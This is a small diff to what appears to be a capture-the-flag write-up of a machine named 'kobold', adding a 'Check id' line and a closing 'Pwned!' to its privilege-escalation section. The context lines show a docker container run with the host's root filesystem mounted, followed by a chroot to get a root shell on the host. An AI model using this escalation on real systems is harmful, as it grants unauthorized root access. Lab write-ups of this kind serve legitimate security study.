@@ -53,6 +53,7 @@ export TERM=xterm
 ```
 
 ## 3. Privilege Escalation
+- Check id
 ```
 ben@kobold:~$ id
 id
@@ -109,3 +110,4 @@ docker run -it -v /:/mnt --rm -u root --entrypoint /bin/sh privatebin/nginx-fpm-
 ```
 chroot /mnt /bin/bash
 ```
+- Pwned!
